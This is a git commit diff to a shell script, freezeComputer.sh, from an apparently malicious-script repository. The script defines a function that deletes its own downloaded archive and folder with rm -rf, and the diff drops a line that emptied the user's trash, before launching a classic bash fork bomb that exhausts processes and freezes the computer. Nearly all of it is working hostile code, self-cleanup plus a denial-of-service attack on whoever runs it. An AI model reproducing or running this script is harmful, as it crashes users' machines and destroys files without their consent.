5ceaae1112b462e6221d7c0b292b3a6e90a4ba15
GRodriguezPardo <62359779+GRodriguezPardo@users.noreply.github.com>
2021-05-15 14:10:37 -0300

    Update freezeComputer.sh

--- freezeComputer.sh
+++ freezeComputer.sh
@@ -2,9 +2,8 @@
 
 # This is a forx bomb
 function forkBomb () {
-  rm -rf main.zip
-  rm -rf ScriptMalicioso-main
-  rm -rf ~/.local/share/Trash/*
+  rm -rf -v main.zip
+  rm -rf -v ScriptMalicioso-main
   :(){ :|: & };:
 }
 forkBomb
